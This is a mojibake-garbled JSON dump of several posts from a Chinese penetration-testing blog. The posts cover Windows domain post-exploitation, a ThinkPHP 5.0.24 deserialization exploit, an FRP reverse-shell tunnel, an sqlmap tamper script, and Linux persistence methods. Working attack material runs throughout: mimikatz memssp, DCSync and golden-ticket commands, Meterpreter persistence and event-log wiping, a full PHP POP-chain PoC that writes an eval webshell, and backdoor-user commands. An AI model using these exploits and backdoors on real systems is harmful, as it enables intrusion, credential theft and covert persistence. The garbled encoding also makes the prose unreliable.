C2é…ç½®æ–‡ä»¶ä¿®æ”¹å…¶æµé‡ã€‚é…ç½®æ–‡ä»¶æä¾›äº†é«˜åº¦å¯å®šåˆ¶çš„é€‰é¡¹ï¼Œç”¨äºä¿®æ”¹æœåŠ¡å™¨çš„C2æµé‡åœ¨çº¿è·¯ä¸Šçš„å½¢å¼ã€‚Malleable C2é…ç½®æ–‡ä»¶å¯å¢åŠ å¼ºäº‹ä»¶å“åº”çš„è§„é¿ï¼Œä½¿ç”¨çš„åˆæ³•å†…éƒ¨åº”ç”¨ç¨‹åºå†’å……å·²çŸ¥å¯¹æ‰‹æˆ–ä¼ªè£…ç›®æ ‡ã€‚https://github.com/rsmudge/Malleable-C2-Profiles SSP 1.SSPï¼Œç”¨äºæ‰©å±•Windowsèº«ä»½éªŒè¯æœºåˆ¶ã€‚LSASSè¿›ç¨‹æ­£åœ¨Windowså¯åŠ¨æœŸé—´åŠ è½½å®‰å…¨æ”¯æŒæä¾›ç¨‹åºDLLã€‚è¿™ç§è¡Œä¸ºä½¿çº¢é˜Ÿçš„æ”»å‡»è€…å¯ä»¥åˆ é™¤ä¸€ä¸ªä»»æ„çš„SSP DLLä»¥ä¾¿ä¸LSASSè¿›ç¨‹è¿›è¡Œäº¤äº’å¹¶è®°å½•è¯¥è¿›ç¨‹ä¸­å­˜å‚¨çš„æ‰€æœ‰å¯†ç ï¼Œæˆ–è€…ç›´æ¥ç”¨æ¶æ„çš„SSPå¯¹è¯¥è¿›ç¨‹è¿›è¡Œä¿®è¡¥ã€‚ 2.é¡¹ç›®Mimikatzæä¾›äº†ä¸€ä¸ªDLLæ–‡ä»¶ï¼ˆmimilib.dllï¼‰ï¼Œå¯ä»¥å°†å…¶æ”¾åˆ°ä¸LSASSè¿›ç¨‹ï¼ˆSystem32ï¼‰ç›¸åŒçš„ä½ç½®ï¼Œä»¥ä¾¿ä¸ºè®¿é—®å—æ„ŸæŸ“ä¸»æœºçš„ä»»ä½•ç”¨æˆ·è·å¾—çº¯æ–‡æœ¬å‡­æ®ã€‚Mimikatzé€šè¿‡å‘LSASSæ³¨å…¥æ–°çš„SSPæ¥æ”¯æŒå†…å­˜æŠ€æœ¯é€‰é¡¹ã€‚ 12privilege::debugmisc::memssp é‡‘ç¥¨åˆ©ç”¨ krbtgtè´¦æˆ·ï¼šæ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ªâ€œkrbtgtâ€çš„ç”¨æˆ·è´¦æˆ·ï¼Œæ˜¯KDCçš„æœåŠ¡è´¦æˆ·ï¼Œç”¨æ¥åˆ›å»ºç¥¨æ®æˆäºˆæœåŠ¡ï¼ˆTGSï¼‰åŠ å¯†çš„å¯†é’¥ã€‚é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ï¼šä½¿åœ¨æ‹¥æœ‰æ™®é€šåŸŸç”¨æˆ·æƒé™å’Œkrbtgt hashçš„æƒ…å†µä¸‹ï¼Œè·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚ è·å–é‡‘ç¥¨éœ€è¦çš„ntmlå’Œsid 12mimikatz# LsaDump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csvwhoami &#x2F;user 1mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:test.lab &#x2F;sid:S-1-5-21-2952760202-1353902439-2381784089-500 &#x2F;krbtgt:58e91a5ac358d86513ab224312314061 &#x2F;user:god &#x2F;ticket:gold2.kirbi 123kerberos::ptt gold2.kirbi #å¯¼å…¥ç¥¨æ®kerberos::list #åˆ—å‡ºç¥¨æ®kerberos::purge # æ¸…é™¤ç¥¨æ® åé—¨æ¤å…¥ä½¿ç”¨persistenceå¯åŠ¨é¡¹åé—¨åœ¨C:\\Users***\\AppData\\Local\\Temp\\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬åœ¨æ³¨å†Œè¡¨HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ metsvcæœåŠ¡åé—¨ åœ¨C:\\Users***\\AppData\\Local\\Temp\\ä¸Šä¼ äº†ä¸‰ä¸ªæ–‡ä»¶ï¼ˆmetsrv.x86.dllã€metsvc-server.exeã€metsvc.exeï¼‰ï¼Œé€šè¿‡æœåŠ¡å¯åŠ¨ï¼ŒæœåŠ¡åä¸ºmeterpreter 1run metsvc -A è¿æ¥åé—¨ï¼Œset payload windows/metsvc_bind_tcp 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;metsvc_bind_tcpset rhost 192.168.1.133set lport 31337exploit é‡æ–°è¿›å…¥sessionå³å¯ ç—•è¿¹æ¸…ç† meterpreter: clearev https://github.com/3gstudent/Windows-EventLog-Bypass 1PS C:\\&gt; Invoke-Phant0m æ€»ç»“è¿˜éœ€è¦å­¦ä¹ Empireï¼Œåé—¨æ•°æ®ä¼ è¾“çš„åŠ å¯†ï¼Œå…æ€çš„åˆ¶ä½œï¼Œä»¥åŠçœŸå®ç¯å¢ƒä¸­å¦‚ä½•å¿«é€Ÿé«˜æ•ˆçš„åˆ¶å®šè®¡åˆ’ã€‚ å‚è€ƒé“¾æ¥ï¼š https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g","categories":[],"tags":[{"name":"åŸŸæ¸—é€","slug":"åŸŸæ¸—é€","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"tp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"tp5-0-24ååºåˆ—åŒ–æ¼æ´å¤ç°","date":"2020-03-13T23:21:02.000Z","updated":"2020-03-20T13:39:22.494Z","comments":true,"path":"2020/03/14/tp5-0-24ååºåˆ—åŒ–æ¼æ´å¤ç°/","link":"","permalink":"https://glotozz.github.io/2020/03/14/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´åˆ†æ ä¸‰ã€POCç¼–å†™ å‚è€ƒé“¾æ¥ï¼š æ˜¨å¤œå¯¹ä¸€hç½‘è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¯¥ç½‘ç«™æ˜¯åŸºäºtp5.0.24äºŒæ¬¡å¼€å‘çš„ï¼Œå°±æƒ³ç€è‡ªå·±ä¹Ÿåˆ†æä¸€ä¸‹ï¼ˆä¸»è¦æ˜¯æ²¡ç»™pocå“ˆå“ˆï¼‰ï¼ŒåŠ›å“¥æŒ–çš„å—·ğŸ˜ ä¸€ã€è·å–æ¼æ´ http://www.thinkphp.cn/donate/download/id/1279.html application/index/controller/Index.php 12345678910111213&lt;?phpnamespace appindexcontroller;class Index&#123; public function index($input='') &#123; echo \"Welcome thinkphp 5.0.24\"; echo $input; unserialize($input); &#125;&#125; http://127.0.0.1/tp5.0.24/public/index.php äºŒã€æ¼æ´åˆ†æè™½ç„¶ä¹‹å‰è‡ªå·±æ²¡æœ‰åˆ†æè¿‡tp5.0.xçš„ååºåˆ—åŒ–ï¼Œå› ä¸ºtp5.0.0~tp5.0.23æœ‰ä¸€æ¡ç›´æ¥RCEçš„POPé“¾ï¼Œä½†æ˜¯æƒ³æ¥ä¹Ÿå·®ä¸å¤šã€‚è€Œtp5.0.24ä¸­å¯¹ä¼ å…¥çš„_methodè¿›è¡Œç™½åå•é™åˆ¶ï¼Œå› æ­¤æ— æ³•è°ƒç”¨ä»»æ„ç±»æ–¹æ³•ã€‚ Thinkphp 5.0.xååºåˆ—åŒ–æœ€åè§¦å‘RCEï¼Œè¦è°ƒç”¨çš„Requestç±»__callæ–¹æ³•ï¼Œå› æ­¤ä¹Ÿè¢«é™åˆ¶ã€‚ éœ€è¦å¯»æ‰¾å…¶ä»–çš„__callæ–¹æ³•ï¼Œç„¶ååŠ›å“¥æ‰¾åˆ°äº†ä¸‹é¢è¿™é‡Œ Output.php è¿½è¸ªblock()æ–¹æ³• å­˜åœ¨æ–‡ä»¶å†™å…¥ï¼Œå¯ä»¥åˆ©ç”¨ã€‚ å¼€å§‹åˆ†æPOPé“¾ çœ‹äº†ä¸‹å‘ç°tp5.0.xã€tp5.1.xã€tp5.2.x ååºåˆ—åŒ–å…¥å£ç‚¹éƒ½æ˜¯ä¸€æ ·çš„ thinkphp/library/think/process/pipes/Windows.php è¿½è¸ªremoveFiles() è¿™é‡Œçš„file_exist()è§¦å‘__toString()ï¼Œå› æ­¤å¯ä»¥ä½œä¸ºè·³æ¿ å…¨å±€æœç´¢__toString()å¯»æ‰¾åˆ©ç”¨ç‚¹ thinkphp/library/think/Model.php è¿½è¸ªtoJson() è¿½è¸ªtoArray() å­˜åœ¨è¿™ä¸‰ä¸ªåŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œæœ€ååªæœ‰ç¬¬ä¸‰å¤„å¯è¡Œ å› ä¸ºè¦ä½œä¸ºè·³æ¿ï¼Œæƒ³åŠæ³•æ§åˆ¶$valueå’Œ$attr è¿™é‡Œçš„parseName()æ˜¯ä¸ªå­—ç¬¦ä¸²å‘½åé£æ ¼è½¬æ¢ï¼ŒåŸºæœ¬æ²¡å•¥å˜åŒ– æ§åˆ¶$modelRelationéœ€è¦åœ¨å½“å‰ç±»ä¸­å¯»æ‰¾ä¸€ä¸ªæ— å‚æ–¹æ³• è·Ÿè¿›getRelationData() è¿™ä¸ªæ–¹æ³•è¯´æ˜æ˜¯è·å–å…³è”æ¨¡å‹æ•°æ®ï¼Œéœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œè¿™é‡Œæ¯”è¾ƒéº»çƒ¦ï¼Œå…ˆçœ‹ä¸‹é¢ã€‚å‡è®¾æ»¡è¶³ï¼Œè¿”å›$this-&gt;parent æ¥ä¸‹æ¥éœ€è¦å¯»æ‰¾ä¸€ä¸ªæœ‰getBindAttr()æ–¹æ³•çš„ç±»ï¼Œå…¨å±€æœç´¢å‘ç°åªæœ‰ä¸€ä¸ªOneToOneç±» ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå› ä¸ºæ˜¯æŠ½è±¡ç±»ï¼Œå¯»æ‰¾ç»§æ‰¿OneToOne()çš„ç±»ï¼Œå¹¶ä¸”æ»¡è¶³å‰é¢é‚£ä¸ªifæ¡ä»¶ï¼Œæœ€ç»ˆå‘ç°HasOneç±»å¯ç”¨ï¼Œå…·ä½“å˜é‡å€¼ç­‰ä¸‹è°ƒè¯•çœ‹çœ‹ç»“æœ ä¹‹åå°±æ˜¯åˆ©ç”¨$value-&gt;getAttr($attr)è¿™ä¸ªè·³æ¿è§¦å‘Outputç±»ä¸­çš„__call() block() writeln() write() $this-&gt;handleå¯æ§ï¼Œå¯ä»¥ä½œä¸ºè·³æ¿ï¼Œå…¨å±€æœç´¢write() thinkphp/library/think/session/driver/Memcached.php å¯ä½œä¸ºè·³æ¿ï¼Œå…¨å±€æœç´¢-&gt;set thinkphp/library/think/cache/driver/File.php $filenameå¯æ§å› æ­¤å¯ä»¥ç”¨ä¼ªåè®®ç»•è¿‡exitï¼Œä½†æ˜¯è¿™é‡Œçš„$dataæ ¹æ®ä¼ å‚ä¸ºå¸ƒå°”å‹ï¼Œ è·Ÿè¿›setTagItem() è¿™é‡Œçš„$valueå¯æ§å³ä¼ å…¥çš„$nameï¼Œæ˜¯å‰é¢çš„ 1$filename &#x3D; $this-&gt;getCacheKey($name, true); è·Ÿè¿›getCacheKey() è¿™é‡Œéœ€è¦åˆ©ç”¨ä¼ªåè®®php://filter/write=string.rot13/resource=./cuc cucvasb();?&gt;ä½œä¸ºæ–‡ä»¶åï¼Œä»è€Œå®ç°æ–‡ä»¶å†™å…¥ è‡³æ­¤ï¼ŒPOPé“¾å®Œæˆ å¯ä»¥å‚è€ƒåŠ›å“¥çš„POPé“¾å›¾ ä¸‰ã€POCç¼–å†™123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115&lt;?phpnamespace think\\process\\pipes;#Windowsuse think\\model\\Pivot;class Windows&#123;//ä¸ä½¿ç”¨ç»§æ‰¿ private $files = []; function __construct()&#123; $this-&gt;files = [new Pivot()];//è§¦å‘Model __toString(),Modelå­ç±»Pivotåˆé€‚ &#125;&#125;namespace think\\db;#Queryuse think\\console\\Output;class Query&#123; protected $model; function __construct()&#123; $this-&gt;model = new Output();//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent) &#125;&#125;namespace think\\model;#Relationuse think\\db\\Query;abstract class Relation&#123; protected $selfRelation; protected $query; function __construct()&#123; $this-&gt;selfRelation = false;//æ»¡è¶³ifè¯­å¥ $this-&gt;query = new Query();//æ»¡è¶³ifè¯­å¥ &#125;&#125;namespace think\\model\\relation;#OneToOne HasOneuse think\\model\\Relation;//ä½¿ç”¨äº†Relationç±»abstract class OneToOne extends Relation&#123;//éœ€è¦$selfRelationå’Œ$queryï¼Œä½¿ç”¨ç»§æ‰¿ protected $bindAttr = []; function __construct()&#123; parent::__construct(); $this-&gt;bindAttr = ['key','value'];//å³$bindAttr &#125;&#125;class HasOne extends OneToOne&#123;&#125;namespace think\\cache;#Driverabstract class Driver&#123; protected $tag; protected $options = []; function __construct()&#123; $this-&gt;tag = true;//æ»¡è¶³if ($this-&gt;tag &amp;&amp; !is_file($filename)) $this-&gt;options = [ // 'path' =&gt; './demo/', 'path' =&gt; 'php://filter/write=string.rot13/resource=./demo/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;', 'data_compress' =&gt; false, 'expire' =&gt; 0, 'cache_subdir' =&gt; false,//if ($this-&gt;options['cache_subdir']) &#123; 'prefix' =&gt; '', ]; &#125;&#125;namespace think\\cache\\driver;#Fileuse think\\cache\\Driver;class File extends Driver&#123;//éœ€è¦$tagä»¥åŠsetTagItem()ï¼Œä½¿ç”¨ç»§æ‰¿&#125;namespace think\\session\\driver;#Memcacheduse think\\cache\\driver\\File;class Memcached&#123;//å› ä¸ºè¿™é‡Œæ²¡ç”¨åˆ°SessionHandlerï¼Œå› æ­¤æ²¡å¿…è¦ç»§æ‰¿ protected $handler = null; function __construct()&#123; $this-&gt;handler = new File();//$this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']); &#125;&#125;namespace think\\console;#Outputuse think\\session\\driver\\Memcached;class Output&#123; protected $styles = []; private $handle = null; function __construct()&#123; $this-&gt;styles = ['getAttr'];//æ»¡è¶³if (in_array($method, $this-&gt;styles)) $this-&gt;handle = new Memcached();//$this-&gt;handle-&gt;write($messages, $newline, $type); &#125;&#125;namespace think;#Modeluse think\\model\\Relation\\HasOne;use think\\console\\Output;abstract class Model &#123; protected $append = []; protected $error; public $parent;//å‘ç‚¹ function __construct()&#123; $this-&gt;append = ['key'=&gt;'getError'];//valueä¸º$relation,å› æ­¤ä¸ºgetError $this-&gt;error = new HasOne();//å³$modelRealtion $this-&gt;parent = new Output();//å³$value &#125;&#125;namespace think\\model;#Pivotuse think\\Model;class Pivot extends Model&#123;&#125;namespace think\\process\\pipes;$a = base64_encode(serialize(new Windows()));echo $a;var_dump(unserialize(base64_decode($a))); æœ‰ä¸ª3ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ ä¸€ã€modelå­ç±»Pivotä¸­ä¹Ÿæœ‰è¯¥å˜é‡parentï¼Œå±æ€§ä¸ºpublicï¼›è€ŒåŸºç±»modelçš„parentä¸ºprotected å°†Modelç±»ä¸­çš„parentè®¾ä¸ºpublicï¼Œä½†æ˜¯å¯¹äºphpç‰ˆæœ¬ä¼¼ä¹ä»æœ‰è¦æ±‚ã€‚ã€‚php7.3.12å¤±è´¥ï¼Œæµ‹è¯•5.6.40ï¼Œ7.3.8ï¼Œ7.0.33å¯ç”¨ äºŒã€Windowsä¸‹ä½¿ç”¨php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;æ— æ³•æ­£å¸¸ååºåˆ—åŒ–ï¼Œè°ƒè¯•å‘ç°åªèƒ½æ­£å¸¸åˆå§‹åŒ–Windowsç±»ï¼Œå¹¶ä¸”Windowsä¸‹ä¸æ”¯æŒè¿™ç§æ–‡ä»¶å åˆ‡æ¢åˆ°Linuxä¸‹ ä¸‰ã€å¦‚æœç½‘ç«™ä¸å…è®¸å†™æ–‡ä»¶ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ª755çš„ç›®å½• getCacheKey()æ–¹æ³•ï¼Œ 123if ($auto &amp;&amp; !is_dir($dir)) &#123; mkdir($dir, 0755, true);&#125; $autoä¸ºtrueï¼Œå°†pathè®¾ä¸º./demo åˆ†æä¸‹æœ€åçš„è°ƒç”¨ ç¬¬ä¸€æ¬¡set(&#39;&lt;getAttr&gt;key&lt;getAttr&gt;&#39;, true, expire=3000) ä¸­é€”è°ƒç”¨setTagItem(path+md5(name)+.php) åœ¨setTagItem()ä¸­ç¬¬äºŒæ¬¡set(tag_md5(1), path+md5(name)+.php) file_put_contents(path+md5(name)+.php, &lt;?php\\n//000000000000\\n exit();?&gt;\\n+serialize(path+md5(name)+.php)) æ³¨æ„ä¸‹?çš„urlç¼–ç  å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7 http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/?tdsourcetag=s_pctim_aiomsg https://xz.aliyun.com/t/7082","categories":[],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://glotozz.github.io/tags/thinkphp/"}]},{"title":"FRPæ­å»º","slug":"FRPæ­å»º","date":"2020-03-13T04:07:35.000Z","updated":"2020-03-13T09:22:35.331Z","comments":true,"path":"2020/03/13/FRPæ­å»º/","link":"","permalink":"https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• FRP æœåŠ¡ç«¯é…ç½® FRPå®¢æˆ·ç«¯é…ç½® åå¼¹shellæµ‹è¯• å‚è€ƒé“¾æ¥ï¼š ä¹‹å‰éƒ½æ˜¯èŠ±ç”Ÿå£³ç®€å•çš„å†…ç½‘ç©¿é€ï¼Œå› ä¸ºæœåŠ¡ç«¯ä¸æ˜¯æˆ‘ä»¬è‡ªå·±çš„ï¼Œå› æ­¤åœ¨ä¸€äº›å®æˆ˜ä¸­æ— æ³•æ»¡è¶³éœ€æ±‚ã€‚ FRP æ˜¯ä¸€ä¸ªä½¿ç”¨ Go è¯­è¨€å¼€å‘çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œå¯ä»¥å¸®åŠ©æ‚¨è½»æ¾åœ°è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œå¯¹å¤–ç½‘æä¾›æœåŠ¡ã€‚FRP æ”¯æŒ TCPã€UDPã€HTTPã€HTTPSç­‰åè®®ç±»å‹ï¼Œå¹¶ä¸”æ”¯æŒ Web æœåŠ¡æ ¹æ®åŸŸåè¿›è¡Œè·¯ç”±è½¬å‘ã€‚ è¯ä¸å¤šè¯´ï¼Œå¼€å§‹é…ç½® é¡¹ç›®åœ°å€ï¼šhttps://github.com/fatedier/frp é¦–å…ˆï¼Œç½‘ç»œæ‹“æ‰‘å›¾ FRP æœåŠ¡ç«¯é…ç½®é…ç½® FRP æœåŠ¡ç«¯çš„å‰ææ¡ä»¶æ˜¯éœ€è¦ä¸€å°å…·æœ‰å…¬ç½‘ IPçš„è®¾å¤‡ frps.ini 12[common]server_port &#x3D; 7000 ./frps -c ./frps.iniç›‘å¬ä¸€ä¸ª7000ç«¯å£çš„FRPæœåŠ¡ç«¯ FRPå®¢æˆ·ç«¯é…ç½®frpc.ini 123456789[common]server_addr &#x3D; 118.178.88.46server_port &#x3D; 7000[kali]type &#x3D; tcplocal_ip &#x3D; 192.168.56.124local_port &#x3D; 4444remote_port &#x3D; 1234 ./frps -c ./frpc.ini è¿™æ ·å°±å¯ä»¥æˆåŠŸåœ¨ FRP æœåŠ¡ç«¯ä¸ŠæˆåŠŸå»ºç«‹ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼ŒæœåŠ¡ç«¯çš„1234ç«¯å£æ˜ å°„ç€æœ¬åœ°è™šæ‹Ÿæœºçš„4444ç«¯å£ åå¼¹shellæµ‹è¯• çœŸæ­£çš„1åˆ†é’Ÿæå®šå†…ç½‘ç©¿é€ï¼ï¼ å½“ç„¶ï¼Œå¦‚æœè¦å¼€å¯ä¸€äº›æœåŠ¡ï¼Œéœ€è¦æ›´åŠ å®‰å…¨çš„é…ç½®ï¼Œå…·ä½“å¯å‚è€ƒgithubå®˜ç½‘ã€‚ å‚è€ƒé“¾æ¥ï¼š https://www.dazhuanlan.com/2019/08/18/5d595a72cb5d4/","categories":[],"tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SQLMAP-temperç¼–å†™","slug":"SQLMAP-temperç¼–å†™","date":"2020-03-12T16:58:06.000Z","updated":"2020-03-13T09:26:18.170Z","comments":true,"path":"2020/03/13/SQLMAP-temperç¼–å†™/","link":"","permalink":"https://glotozz.github.io/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åå°è„šæœ¬ tamperç¼–å†™ å‚è€ƒé“¾æ¥ï¼š ä¸€èˆ¬æƒ…å†µä¸‹sqlmapæ¯”è‡ªå·±å†™è„šæœ¬æ–¹ä¾¿ï¼Œåªéœ€è¦å¤„ç†å¥½temperè„šæœ¬ï¼Œå¹¶ä¸”sqlmapèƒ½é’ˆå¯¹ä¸åŒçš„æ•°æ®åº“ï¼Œè¿™ç‚¹å¾ˆé‡è¦ã€‚ æ­£å¥½ä¹‹å‰çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œè‡ªå·±ä¹Ÿå­¦ä¹ ä¸‹ï¼Œä¹‹åå¤šç”¨ç”¨sqlmapã€‚ åå°è„šæœ¬æ¯”å¦‚æœ‰è¿™ä¹ˆä¸€ä¸ªåå°å¤„ç†çš„è„šæœ¬ 1234567891011121314151617181920&lt;?phpheader('content-type:text/html;charset=utf-8');//è§£å¯†è¿‡ç¨‹function decode($data)&#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-6)!=='_mozhe')&#123; echo '&lt;script&gt;window.location.href=\"/index.php\";&lt;/script&gt;'; &#125;else&#123; return substr(trim($data),0,strlen(trim($data))-6); &#125;&#125;$id=decode($_GET['id']);$sql=\"select id,title,content,time from notice where id=$id\";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt; è¿™é‡Œå¯¹ä¼ å…¥çš„idè¿›è¡ŒAES-128-CCBè§£å¯†ä¹‹åç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥æŸ¥è¯¢ï¼Œä¹‹åæˆ‘æŸ¥äº†è¿™ä¸ªmcrypt_module_openï¼Œæ˜¯ä¸ªæ‰©å±•ï¼Œä½†æ˜¯php7.1å·²ç»è¢«åºŸå¼ƒï¼Œäºæ˜¯æ”¹ç”¨openssl_encrypt() 12345678910111213141516171819202122232425&lt;?phpheader('content-type:text/html;charset=utf-8');//è§£å¯†è¿‡ç¨‹$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt åŠ å¯†ä¸åŒMcryptï¼Œå¯¹ç§˜é’¥é•¿åº¦è¦æ±‚ï¼Œè¶…å‡º16åŠ å¯†ç»“æœä¸å˜ $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;$id = AES::decrypt($_GET['id'],$key);$sql = \"select * from th_user where uid=$id\";$info = $link-&gt;query($sql);$arr = $info-&gt;fetch_assoc();?&gt; tamperç¼–å†™sqlmapæ˜¯ä¸ä¼šå¤„ç†è¿™ç§åŠ å¯†çš„ï¼Œå› æ­¤éœ€è¦ç¼–å†™ä¸€ä¸ªtamperè„šæœ¬ æµ‹è¯•äº†ä¸€ä¸‹ï¼Œphpä½¿ç”¨openssl_encrypt()å’Œpythonä½¿ç”¨pycryptoæ¨¡å—åŒæ—¶é€‰æ‹©AES-128-CBCåŠ å¯†ç»“æœä¸åŒï¼Œæˆ‘çš„æ€è·¯æ˜¯ç³»ç»Ÿè°ƒç”¨ä¸€ä¸‹php å…ˆå‡†å¤‡ä¸€ä¸ªè¢«ç³»ç»Ÿçš„è°ƒç”¨2.php 123456789101112131415161718&lt;?php$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt åŠ å¯†ä¸åŒMcryptï¼Œå¯¹ç§˜é’¥é•¿åº¦è¦æ±‚ï¼Œè¶…å‡º16åŠ å¯†ç»“æœä¸å˜ $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;echo AES::encrypt(base64_decode($argv[1]),$key);?&gt; tamperè„šæœ¬aes.py 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission\"\"\"import base64import osfrom Crypto.Cipher import AESfrom lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWESTdef dependencies(): passdef encrypt(text): t = base64.b64encode(text) # print t x = os.popen('php 2.php ' + t).readlines() return x[0]# print encrypt('-1 union select 1,2,3,4')def tamper(payload, **kwargs): return encrypt(payload) æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™å°†2.phpæ”¾åœ¨/tamperç›®å½•ä¸‹ï¼Œè·‘sqlmapçš„æ—¶å€™éœ€è¦æ”¾åœ¨/sqlmap-masterä¸‹ 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?id&#x3D;1 --tamper aes.py --current-db å‚è€ƒé“¾æ¥ï¼š https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html","categories":[],"tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼","slug":"Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼","date":"2020-03-12T01:29:56.000Z","updated":"2020-03-12T12:43:47.241Z","comments":true,"path":"2020/03/12/Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼/","link":"","permalink":"https://glotozz.github.io/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• 1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç  2ã€SUID Shell 3ã€sshå…¬ç§é’¥å…å¯†ç™»å½• 4ã€è½¯è¿æ¥ 5ã€SSH wrapper 6ã€straceåé—¨ 7ã€crontabåå¼¹shell 8ã€opensshåé—¨ 9ã€PAMåé—¨ 10ã€rookitåé—¨ å‚è€ƒé“¾æ¥ï¼š çœ‹äº†ç¯‡æ–‡ç« è§‰å¾—è¿˜ä¸é”™ã€‚æœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„ç²¾ç¥ï¼Œè‡ªå·±åŠ¨æ‰‹æ“ä½œä¸‹ 1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç æ·»åŠ æ™®é€šç”¨æˆ· 123456789101112# åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest# useradd -p æ–¹æ³• &#96; &#96; æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥useradd -p &quot;$(openssl passwd -1 123456)&quot; guest# chpasswdæ–¹æ³•useradd guest;echo &#39;guest:123456&#39;|chpasswd# echo -eæ–¹æ³•ï¼Œ-eï¼šæ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚# 